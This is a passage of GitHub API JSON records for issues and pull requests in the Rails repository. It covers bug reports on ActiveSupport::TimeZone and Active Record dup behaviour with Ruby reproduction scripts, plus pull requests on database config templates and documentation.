        "closed_at": "2024-02-09T23:31:28Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n<!-- (Guidelines for creating a bug report are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#creating-a-bug-report)) -->\r\nInstantiate an `ActiveSupport::TimeZone` object using the [\"initialize\" syntax](https://github.com/rails/rails/blob/f14401aa17c02cfad2213b5bb92a650f43ee4b86/activesupport/lib/active_support/values/time_zone.rb#L299):\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\n```ruby\r\nActiveSupport::TimeZone.new('America/Toronto', -28800)\r\n```\r\n\r\n### Expected behavior\r\n<!-- Tell us what should happen -->\r\nAn object should be returned of `ActiveSupport::TimeZone` class.\r\n\r\n### Actual behavior\r\n<!-- Tell us what happens instead -->\r\nAn exception is raised: \"ArgumentError: wrong number of arguments (given 2, expected 1)\".\r\n\r\nThis occurs because the [`new` method](https://github.com/rails/rails/blob/f14401aa17c02cfad2213b5bb92a650f43ee4b86/activesupport/lib/active_support/values/time_zone.rb#L299) over-writes the [`initialize` method](https://github.com/rails/rails/blob/f14401aa17c02cfad2213b5bb92a650f43ee4b86/activesupport/lib/active_support/values/time_zone.rb#L303), and it only expects one argument.\r\n\r\n### System configuration\r\n**Rails version**: 7.1.2\r\n\r\n**Ruby version**: 3.1.3\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50976/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50976/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50975",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50975/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50975/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50975/events",
        "html_url": "https://github.com/rails/rails/pull/50975",
        "id": 2119500748,
        "node_id": "PR_kwDNIULOZhMvRw",
        "number": 50975,
        "title": "Enhance database config templates for flexible env connections",
        "user": {
            "login": "viktorianer",
            "id": 12413247,
            "node_id": "MDQ6VXNlcjEyNDEzMjQ3",
            "avatar_url": "https://avatars.githubusercontent.com/u/12413247?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/viktorianer",
            "html_url": "https://github.com/viktorianer",
            "followers_url": "https://api.github.com/users/viktorianer/followers",
            "following_url": "https://api.github.com/users/viktorianer/following{/other_user}",
            "gists_url": "https://api.github.com/users/viktorianer/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/viktorianer/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/viktorianer/subscriptions",
            "organizations_url": "https://api.github.com/users/viktorianer/orgs",
            "repos_url": "https://api.github.com/users/viktorianer/repos",
            "events_url": "https://api.github.com/users/viktorianer/events{/privacy}",
            "received_events_url": "https://api.github.com/users/viktorianer/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 6,
        "created_at": "2024-02-05T21:38:18Z",
        "updated_at": "2024-02-08T17:34:50Z",
        "closed_at": "2024-02-08T17:34:49Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50975",
            "html_url": "https://github.com/rails/rails/pull/50975",
            "diff_url": "https://github.com/rails/rails/pull/50975.diff",
            "patch_url": "https://github.com/rails/rails/pull/50975.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nThis Pull Request has been created to enhance the flexibility and usability of the Rails `database.yml` configuration for PostgreSQL databases. Currently, Rails applications default to connecting to PostgreSQL through a local Unix socket for development environments. This setup works well for local development but becomes cumbersome when developers use Dockerized PostgreSQL instances or switch between local and Docker environments. \r\n\r\n```bash\r\n> rails db:prepare\r\nbin/rails aborted!\r\nActiveRecord::ConnectionNotEstablished: connection to server on socket \"/tmp/.s.PGSQL.5432\" failed: No such file or directory (ActiveRecord::ConnectionNotEstablished)\r\n\tIs the server running locally and accepting connections on that socket?\r\n\r\nCaused by:\r\nPG::ConnectionBad: connection to server on socket \"/tmp/.s.PGSQL.5432\" failed: No such file or directory (PG::ConnectionBad)\r\n\tIs the server running locally and accepting connections on that socket?\r\n```\r\n\r\nBy facilitating easy switching between these environments without the need to manually edit the `database.yml` file, this PR aims to streamline the development workflow, making it more efficient and less error-prone.\r\n\r\n### Detail\r\n\r\nThis Pull Request changes the PostgreSQL database configuration template (`postgresql.yml.tt`) by introducing dynamic environment variable support for the `host`, `username`, and, `password` settings in the default configuration. Specifically, it allows these settings to be overridden via environment variables, with defaults provided for local development. This approach enables developers to easily switch between a local PostgreSQL server and a Dockerized PostgreSQL instance by simply setting or unsetting environment variables, without the need for manual configuration file edits.\r\n\r\n### Additional information\r\n\r\nThis approach supports the idea in https://github.com/rails/rails/pull/50914#discussion_r1478343297.\r\n\r\n~~I do not like to use `\"<%= app_name.upcase %>_...\" in variable names, but I followed the naming in https://github.com/rails/rails/blob/2c5fe6fa7aba4a10d56ff4ee54d26511e58dda3b/railties/lib/rails/generators/rails/app/templates/config/databases/postgresql.yml.tt#L84.~~\r\n\r\n~~As suggested in https://github.com/rails/rails/pull/50914#discussion_r1478855943, I would rather use `DATABASE_URL`, `POSTGRES_USER`, and `POSTGRES_PASSWORD`.~~\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n\r\nI am not able to run the tests in Dev Container or locally on macOS (it crashes ).  Of course, I would love to add or fix tests, need more tome to set up the local environment.\r\n\r\nBut I could create a new app from local branch, which includes correct generated Postgres database config (https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#running-an-application-against-your-local-branch).",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50975/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50975/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50974",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50974/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50974/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50974/events",
        "html_url": "https://github.com/rails/rails/issues/50974",
        "id": 2119381713,
        "node_id": "I_kwDNIULOflMy0Q",
        "number": 50974,
        "title": "Active Record marks attributes as `_changed?` after `dup`ing a persisted instance",
        "user": {
            "login": "nvasilevski",
            "id": 5512772,
            "node_id": "MDQ6VXNlcjU1MTI3NzI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5512772?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/nvasilevski",
            "html_url": "https://github.com/nvasilevski",
            "followers_url": "https://api.github.com/users/nvasilevski/followers",
            "following_url": "https://api.github.com/users/nvasilevski/following{/other_user}",
            "gists_url": "https://api.github.com/users/nvasilevski/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/nvasilevski/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/nvasilevski/subscriptions",
            "organizations_url": "https://api.github.com/users/nvasilevski/orgs",
            "repos_url": "https://api.github.com/users/nvasilevski/repos",
            "events_url": "https://api.github.com/users/nvasilevski/events{/privacy}",
            "received_events_url": "https://api.github.com/users/nvasilevski/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 126910270,
                "node_id": "MDU6TGFiZWwxMjY5MTAyNzA=",
                "url": "https://api.github.com/repos/rails/rails/labels/With%20reproduction%20steps",
                "name": "With reproduction steps",
                "color": "009800",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": {
            "login": "nvasilevski",
            "id": 5512772,
            "node_id": "MDQ6VXNlcjU1MTI3NzI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5512772?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/nvasilevski",
            "html_url": "https://github.com/nvasilevski",
            "followers_url": "https://api.github.com/users/nvasilevski/followers",
            "following_url": "https://api.github.com/users/nvasilevski/following{/other_user}",
            "gists_url": "https://api.github.com/users/nvasilevski/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/nvasilevski/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/nvasilevski/subscriptions",
            "organizations_url": "https://api.github.com/users/nvasilevski/orgs",
            "repos_url": "https://api.github.com/users/nvasilevski/repos",
            "events_url": "https://api.github.com/users/nvasilevski/events{/privacy}",
            "received_events_url": "https://api.github.com/users/nvasilevski/received_events",
            "type": "User",
            "site_admin": false
        },
        "assignees": [
            {
                "login": "nvasilevski",
                "id": 5512772,
                "node_id": "MDQ6VXNlcjU1MTI3NzI=",
                "avatar_url": "https://avatars.githubusercontent.com/u/5512772?v=4",
                "gravatar_id": "",
                "url": "https://api.github.com/users/nvasilevski",
                "html_url": "https://github.com/nvasilevski",
                "followers_url": "https://api.github.com/users/nvasilevski/followers",
                "following_url": "https://api.github.com/users/nvasilevski/following{/other_user}",
                "gists_url": "https://api.github.com/users/nvasilevski/gists{/gist_id}",
                "starred_url": "https://api.github.com/users/nvasilevski/starred{/owner}{/repo}",
                "subscriptions_url": "https://api.github.com/users/nvasilevski/subscriptions",
                "organizations_url": "https://api.github.com/users/nvasilevski/orgs",
                "repos_url": "https://api.github.com/users/nvasilevski/repos",
                "events_url": "https://api.github.com/users/nvasilevski/events{/privacy}",
                "received_events_url": "https://api.github.com/users/nvasilevski/received_events",
                "type": "User",
                "site_admin": false
            }
        ],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-05T20:14:37Z",
        "updated_at": "2024-02-08T18:24:04Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "Similar to https://github.com/rails/rails/issues/50971 to the point where I suspect the fix may end up being the same for both\r\n\r\nI'll be working on this bug, opening an issue for visibility and in case if someone disagrees that this is a bug.\r\n\r\n### Context\r\n\r\nCurrently calling `dup` on a persisted object with non-default attribute values makes all attributes as `_changed?` regardless of the actual state. Instead it should preserve the states of the duped object\r\n\r\n### Reproduction script:\r\n\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\"\r\n\r\n  gem \"sqlite3\"\r\n  gem \"debug\"\r\nend\r\n\r\nrequire \"debug\"\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\n# This connection will do for database-independent bug reports.\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :people, force: true do |t|\r\n    t.string :name\r\n    t.integer :age\r\n  end\r\nend\r\n\r\nclass Person < ActiveRecord::Base\r\nend\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_dup_does_not_change_attribute_properties\r\n    person = Person.create(name: \"Nikita\", age: 1)\r\n    person.name = \"Nikita V\"\r\n\r\n    assert_predicate person, :name_changed?\r\n    refute_predicate person, :age_changed?\r\n\r\n    person_dup = person.dup\r\n\r\n    assert_predicate person_dup, :name_changed?\r\n    refute_predicate person_dup, :age_changed?\r\n  end\r\n\r\n  def test_clone_does_not_change_attribute_properties\r\n    person = Person.create(name: \"Nikita\", age: 1)\r\n    person.name = \"Nikita V\"\r\n\r\n    assert_predicate person, :name_changed?\r\n    refute_predicate person, :age_changed?\r\n\r\n    person_dup = person.clone\r\n\r\n    assert_predicate person_dup, :name_changed?\r\n    refute_predicate person_dup, :age_changed?\r\n  end\r\nend\r\n\r\n```\r\n\r\nFailure:\r\n\r\n```\r\nFailure:\r\nBugTest#test_dup_does_not_change_attribute_properties:\r\nExpected #<Person id: nil, name: \"Nikita V\", age: 1> to not be age_changed?.\r\n```\r\n\r\nNOTE: `clone` example passes as is. Adding it to make sure that changes around this area won't accidentally break `clone`",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50974/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50974/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50973",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50973/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50973/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50973/events",
        "html_url": "https://github.com/rails/rails/pull/50973",
        "id": 2119367738,
        "node_id": "PR_kwDNIULOZhFZlQ",
        "number": 50973,
        "title": "[RF DOCS] Action Mailbox Documention [ci-skip]",
        "user": {
            "login": "bhumi1102",
            "id": 1966473,
            "node_id": "MDQ6VXNlcjE5NjY0NzM=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1966473?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/bhumi1102",
            "html_url": "https://github.com/bhumi1102",
            "followers_url": "https://api.github.com/users/bhumi1102/followers",
            "following_url": "https://api.github.com/users/bhumi1102/following{/other_user}",
            "gists_url": "https://api.github.com/users/bhumi1102/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/bhumi1102/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/bhumi1102/subscriptions",
            "organizations_url": "https://api.github.com/users/bhumi1102/orgs",
            "repos_url": "https://api.github.com/users/bhumi1102/repos",
            "events_url": "https://api.github.com/users/bhumi1102/events{/privacy}",
            "received_events_url": "https://api.github.com/users/bhumi1102/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            },
            {
                "id": 6434393529,
                "node_id": "LA_kwDNIULPAAAAAX-FDbk",
                "url": "https://api.github.com/repos/rails/rails/labels/rails%20foundation",
                "name": "rails foundation",
                "color": "e99695",
                "default": false,
                "description": "Rails Foundation PRs"
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-05T20:04:36Z",
        "updated_at": "2024-02-14T18:02:15Z",
        "closed_at": "2024-02-14T18:02:15Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50973",
            "html_url": "https://github.com/rails/rails/pull/50973",
            "diff_url": "https://github.com/rails/rails/pull/50973.diff",
            "patch_url": "https://github.com/rails/rails/pull/50973.patch",
            "merged_at": "2024-02-14T18:02:15Z"
        },
        "body": "## Overview\r\n\r\nAction Mailbox is a pretty useful / interesting sub-framework of Rails, that more apps probably could benefit from. It does have a number of moving parts so I focused on explaining the flow of how things work. I did a lot of 'in-app testing' of the docs by implementing its features in a rails app and exploring what's missing in the docs.\r\n\r\n## New sections\r\n\r\nHere are the new things I added, in addition to clarifying the existing text.\r\n\r\n- Processing Incoming Email - more of a step by step of the flow\r\n- Mail object and it's fields\r\n- List of Inbound Email 'status' values\r\n- ActiveJobs that are part of Action Mailbox - Routing and Incineration\r\n\r\n## Testing\r\n\r\nIn addition to testing the Action Mailbox features in-app, I also ran `guides:generate` and `guides:validate` locally. I perused the generated html locally as well.\r\n\r\nI also tested the instructions for one 'real' ingress Postmark (locally with ngrok).\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50973/reactions",
            "total_count": 6,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 6,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50973/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50972",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50972/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50972/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50972/events",
        "html_url": "https://github.com/rails/rails/pull/50972",
        "id": 2119190249,
        "node_id": "PR_kwDNIULOZg7jfg",
        "number": 50972,
        "title": "Remove codespell from contribution guide [ci skip]",
        "user": {
            "login": "akhilgkrishnan",
            "id": 22231095,
            "node_id": "MDQ6VXNlcjIyMjMxMDk1",
            "avatar_url": "https://avatars.githubusercontent.com/u/22231095?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/akhilgkrishnan",
            "html_url": "https://github.com/akhilgkrishnan",
            "followers_url": "https://api.github.com/users/akhilgkrishnan/followers",
            "following_url": "https://api.github.com/users/akhilgkrishnan/following{/other_user}",
            "gists_url": "https://api.github.com/users/akhilgkrishnan/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/akhilgkrishnan/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/akhilgkrishnan/subscriptions",
            "organizations_url": "https://api.github.com/users/akhilgkrishnan/orgs",
            "repos_url": "https://api.github.com/users/akhilgkrishnan/repos",
            "events_url": "https://api.github.com/users/akhilgkrishnan/events{/privacy}",
            "received_events_url": "https://api.github.com/users/akhilgkrishnan/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-05T18:20:59Z",
        "updated_at": "2024-02-05T18:23:30Z",
        "closed_at": "2024-02-05T18:22:43Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50972",
            "html_url": "https://github.com/rails/rails/pull/50972",
            "diff_url": "https://github.com/rails/rails/pull/50972.diff",
            "patch_url": "https://github.com/rails/rails/pull/50972.patch",
            "merged_at": "2024-02-05T18:22:43Z"
        },
        "body": "We are no-longer using `codespell` in rails repository, so we can remove it from guide as well.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50972/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50972/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50971",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50971/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50971/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50971/events",
        "html_url": "https://github.com/rails/rails/issues/50971",
        "id": 2118914321,
        "node_id": "I_kwDNIULOfkwREQ",
        "number": 50971,
        "title": "Active Record marks attributes as `came_from_user?` after `dup`",
        "user": {
            "login": "nvasilevski",
            "id": 5512772,
            "node_id": "MDQ6VXNlcjU1MTI3NzI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5512772?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/nvasilevski",
            "html_url": "https://github.com/nvasilevski",
            "followers_url": "https://api.github.com/users/nvasilevski/followers",
            "following_url": "https://api.github.com/users/nvasilevski/following{/other_user}",
            "gists_url": "https://api.github.com/users/nvasilevski/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/nvasilevski/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/nvasilevski/subscriptions",
            "organizations_url": "https://api.github.com/users/nvasilevski/orgs",
            "repos_url": "https://api.github.com/users/nvasilevski/repos",
            "events_url": "https://api.github.com/users/nvasilevski/events{/privacy}",
            "received_events_url": "https://api.github.com/users/nvasilevski/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 126910270,
                "node_id": "MDU6TGFiZWwxMjY5MTAyNzA=",
                "url": "https://api.github.com/repos/rails/rails/labels/With%20reproduction%20steps",
                "name": "With reproduction steps",
                "color": "009800",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": {
            "login": "nvasilevski",
            "id": 5512772,
            "node_id": "MDQ6VXNlcjU1MTI3NzI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5512772?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/nvasilevski",
            "html_url": "https://github.com/nvasilevski",
            "followers_url": "https://api.github.com/users/nvasilevski/followers",
            "following_url": "https://api.github.com/users/nvasilevski/following{/other_user}",
            "gists_url": "https://api.github.com/users/nvasilevski/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/nvasilevski/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/nvasilevski/subscriptions",
            "organizations_url": "https://api.github.com/users/nvasilevski/orgs",
            "repos_url": "https://api.github.com/users/nvasilevski/repos",
            "events_url": "https://api.github.com/users/nvasilevski/events{/privacy}",
            "received_events_url": "https://api.github.com/users/nvasilevski/received_events",
            "type": "User",
            "site_admin": false
        },
        "assignees": [
            {
                "login": "nvasilevski",
                "id": 5512772,
                "node_id": "MDQ6VXNlcjU1MTI3NzI=",
                "avatar_url": "https://avatars.githubusercontent.com/u/5512772?v=4",
                "gravatar_id": "",
                "url": "https://api.github.com/users/nvasilevski",
                "html_url": "https://github.com/nvasilevski",
                "followers_url": "https://api.github.com/users/nvasilevski/followers",
                "following_url": "https://api.github.com/users/nvasilevski/following{/other_user}",
                "gists_url": "https://api.github.com/users/nvasilevski/gists{/gist_id}",
                "starred_url": "https://api.github.com/users/nvasilevski/starred{/owner}{/repo}",
                "subscriptions_url": "https://api.github.com/users/nvasilevski/subscriptions",
                "organizations_url": "https://api.github.com/users/nvasilevski/orgs",
                "repos_url": "https://api.github.com/users/nvasilevski/repos",
                "events_url": "https://api.github.com/users/nvasilevski/events{/privacy}",
                "received_events_url": "https://api.github.com/users/nvasilevski/received_events",
                "type": "User",
                "site_admin": false
            }
        ],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-05T16:07:53Z",
        "updated_at": "2024-02-06T16:49:24Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "I'll be working on this bug. Opening an issue for visibility and to allow community to disagree whether the behavior is intended or not.\r\n\r\n### Context\r\n\r\nCalling `.dup` on an Active Record instance causes all attributes to be marked as \"came from user\" despite of their original state. \r\nThis seems like a bug as it leads to completely untouched attributes to return `true` from `came_from_user? calls. \r\nThe only small concern I have is that the `*_came_from_user?` methods don't seem to be publicly documented. However I assume they intend to become public and also Rails itself relies on the method to work correctly so it should be worth fixing\r\n\r\n### Reproduction script:\r\n\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\"\r\n\r\n  gem \"sqlite3\"\r\n  gem \"debug\"\r\nend\r\n\r\nrequire \"debug\"\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\n# This connection will do for database-independent bug reports.\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :people, force: true do |t|\r\n    t.string :name\r\n    t.integer :age\r\n  end\r\nend\r\n\r\nclass Person < ActiveRecord::Base\r\nend\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_dup_does_not_change_attribute_value_type\r\n    person = Person.new(name: \"Nikita\")\r\n\r\n    assert_predicate person, :name_came_from_user?\r\n    refute_predicate person, :age_came_from_user?\r\n\r\n    person_dup = person.dup\r\n\r\n    assert_predicate person_dup, :name_came_from_user?\r\n    refute_predicate person_dup, :age_came_from_user?\r\n  end\r\n\r\n  def test_clone_does_not_change_attribute_value_type\r\n    person = Person.new(name: \"Nikita\")\r\n\r\n    assert_predicate person, :name_came_from_user?\r\n    refute_predicate person, :age_came_from_user?\r\n\r\n    person_copy = person.clone\r\n\r\n    assert_predicate person_copy, :name_came_from_user?\r\n    refute_predicate person_copy, :age_came_from_user?\r\n  end\r\nend\r\n```\r\n\r\nFailure:\r\n```\r\nFailure:\r\nBugTest#test_dup_does_not_change_attribute_value_type:\r\nExpected #<Person id: nil, name: \"Nikita\", age: nil> to not be age_came_from_user?.\r\n```\r\n\r\nNote: `clone` example works as is, I'm adding it just to ensure that the fix doesn't suddenly break `clone` behavior.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50971/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50971/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50970",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50970/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50970/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50970/events",
        "html_url": "https://github.com/rails/rails/pull/50970",
        "id": 2118895387,
        "node_id": "PR_kwDNIULOZgrJLQ",
        "number": 50970,
        "title": "Backport #50964 to 7-1-stable",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-05T15:59:10Z",
